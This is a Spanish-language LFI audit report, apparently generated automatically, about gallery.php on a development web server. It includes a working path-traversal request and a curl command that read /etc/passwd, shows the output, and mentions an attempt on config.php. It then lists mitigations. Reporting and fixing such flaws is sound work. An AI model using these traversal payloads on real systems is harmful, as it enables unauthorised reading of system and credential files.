# Informe de auditoría — LFI

Fecha: 2026-04-27T06:02:39Z
Objetivo: http://web.dev.local:8081 (192.168.100.20:8081)

Resumen ejecutivo
-----------------
Se detectó una vulnerabilidad de Local File Inclusion (LFI) en el parámetro "page" de gallery.php (y potencialmente en index.php). La vulnerabilidad permitió la lectura arbitraria de ficheros locales, confirmada con la obtención de /etc/passwd. Estado: Vulnerabilidad encontrada y explotada.

Evidencia
---------
Petición comprobada (ejemplo):
GET /gallery.php?page=../../../../etc/passwd HTTP/1.1
Host: web.dev.local:8081

Respuesta (extracto):
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...

También se probó: index.php?page=../../../../etc/passwd y index.php?page=../config.php; el vector con gallery.php devolvió el contenido de /etc/passwd exitosamente.

Pasos para reproducir
---------------------
1) Acceder a la URL vulnerable desde una máquina que resuelva web.dev.local:
   curl -s "http://web.dev.local:8081/gallery.php?page=../../../../etc/passwd"
2) Verificar que la respuesta contiene el contenido de /etc/passwd o de otro fichero local.

Alcance y severidad
-------------------
- Severidad: Alta (divulgación de información sensible; posibilidad de escalar dependiendo de ficheros accesibles).
- Impacto: Exposición de usuarios del sistema, información sobre la estructura del servidor, y potencial lectura de ficheros de configuración (p.ej. config.php) si versiones/paths lo permiten.

Recomendaciones de mitigación
-----------------------------
1) Eliminar cualquier inclusión directa de rutas controladas por el usuario. No usar include/require con valores suministrados sin validación.
2) Implementar una allowlist (mapear valores aceptados a rutas internas fijas) en lugar de aceptar rutas relativas/absolutas proporcionadas por el usuario.
3) Normalizar y comprobar rutas con realpath() y asegurar que el fichero final esté dentro de un directorio permitido antes de incluirlo.
4) Deshabilitar exposición de información sensible en headers (ocultar versión PHP/Apache) y proteger config.php (acceso por permisos y fuera del docroot si es posible).
5) Aplicar controles de acceso y registros para detectar intentos de LFI.

Conclusión
----------
La web en http://web.dev.local:8081 presenta una LFI explotable que permite leer ficheros del sistema (ver evidencia). Se recomienda corregir la inclusión insegura y aplicar las mitigaciones listadas con prioridad alta.

Autor: Auditor automático

